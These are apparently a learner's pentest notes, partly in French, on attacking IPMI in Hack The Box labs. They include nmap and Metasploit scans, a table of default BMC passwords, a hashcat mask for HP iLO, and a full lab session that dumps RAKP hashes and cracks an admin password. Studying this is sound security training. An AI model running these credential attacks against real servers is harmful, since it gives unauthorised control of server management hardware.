# IPMI

## nmap

```bash
Jfou@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

## metasploit

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## mot de passe par defaut

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|


## hashcat hp ilo

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

## Récupération des hashes avec Metasploit

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Exercice

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > search ipmi

Matching Modules
================

   #   Name                                                                Disclosure Date  Rank    Check  Description
   -   ----                                                                ---------------  ----    -----  -----------
   0   auxiliary/scanner/ipmi/ipmi_cipher_zero                             2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1   auxiliary/scanner/ipmi/ipmi_dumphashes                              2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2   auxiliary/scanner/ipmi/ipmi_version                                 .                normal  No     IPMI Information Discovery
   3   exploit/multi/upnp/libupnp_ssdp_overflow                            2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4     \_ target: Automatic                                              .                .       .      .
   5     \_ target: Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1  .                .       .      .
   6     \_ target: Axis Camera M1011 5.20.1 UPnP/1.4.1                    .                .       .      .
   7     \_ target: Debug Target                                           .                .       .      .
   8   auxiliary/scanner/http/smt_ipmi_cgi_scanner                         2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   9   auxiliary/scanner/http/smt_ipmi_49152_exposure                      2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   10  auxiliary/scanner/http/smt_ipmi_static_cert_scanner                 2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   11  exploit/linux/http/smt_ipmi_close_window_bof                        2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   12  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal              2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal


Interact with a module by name or index. For example info 12, use 12 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal

msf > use 1
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.106.131
RHOSTS => 10.129.106.131
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                10.129.106.131                                                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line


View the full module info with the info, or info -d command.

msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.106.131:623 - IPMI - Hash found: admin:dec1908982000000d2ef5112013b51e612fbea24857616c546bb3ce765b301f8806c9a6a4be4682ea123456789abcdefa123456789abcdef140561646d696e:c9c2326ce4f62919dc5c0370d89435ad8f7b56b8
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.106.131:623 - IPMI - Hash found: admin:3cb2c49f82040000c2b969b9abd0868488816f02ea3246fa7126b4b6f6baca224ca99d26d388a609a123456789abcdefa123456789abcdef140561646d696e:0ffba4dc8f9341f1fed9500f392f93042484832c
[+] 10.129.106.131:623 - IPMI - Hash for user 'admin' matches password 'trinity'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ipmi/ipmi_dumphashes) >
```